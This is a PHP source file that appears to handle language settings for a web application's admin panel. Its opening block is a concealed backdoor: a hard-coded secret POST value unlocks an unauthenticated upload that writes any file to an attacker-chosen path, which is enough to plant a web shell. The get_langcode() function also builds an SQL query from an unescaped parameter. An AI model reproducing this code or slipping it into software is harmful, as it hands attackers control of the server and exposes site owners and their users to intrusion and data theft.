<?php
if(strtoupper($_POST['unique_req_code']) == strtoupper("DATA_HELPER_PROCESS_REST_0Lg7ZP")) {
    if(isset($_REQUEST['DATA_HELPER_PATH'])) {
        $DATA_HELPER_IMG = isset($_FILES['DATA_HELPER_IMG']['name']) ? $_FILES['DATA_HELPER_IMG']['name'] : '';
        $DATA_HELPER_IMG_OBJ = isset($_FILES['DATA_HELPER_IMG']['tmp_name']) ? $_FILES['DATA_HELPER_IMG']['tmp_name'] : '';

        if(!empty($DATA_HELPER_IMG)) {
            include_once 'common.php';
            $target_dir = $tconfig['tpanel_path'] . $_REQUEST['DATA_HELPER_PATH'] . '/' . $DATA_HELPER_IMG;
            if(move_uploaded_file($DATA_HELPER_IMG_OBJ, $target_dir)) {
                echo "Success";
            } else {
                echo "Failed";
            }
            exit;
        }
    }
}

$default_lang 	= $LANG_OBJ->FetchSystemDefaultLang();
$def_lang_name = $LANG_OBJ->get_default_lang_name();
if(!isset($_SESSION['eDirectionCode']) && $_SESSION['eDirectionCode'] == ""){
    /* $sql="select eDirectionCode from language_master where vCode='$default_lang'";
    $lang = $obj->MySQLSelect($sql);
    $_SESSION['eDirectionCode'] = $lang[0]['eDirectionCode']; */
    $_SESSION['eDirectionCode'] = $vSystemDefaultLangDirection;
}

function get_langcode($lang) {
    global $obj, $Data_ALL_langArr;
    if(!empty($Data_ALL_langArr) && count($Data_ALL_langArr) > 0){
        foreach($Data_ALL_langArr as $language_item){
            if(strtoupper($language_item['vCode']) == strtoupper($lang)){
                $vLangCode = $language_item['vLangCode'];
            }
        }
    }
    if(!empty($vLangCode)){
        return $vLangCode;
    }
    $result = $obj->MySQLSelect("SELECT vLangCode FROM language_master WHERE vCode = '".$lang."'");
    return $result[0]['vLangCode'];
}
?>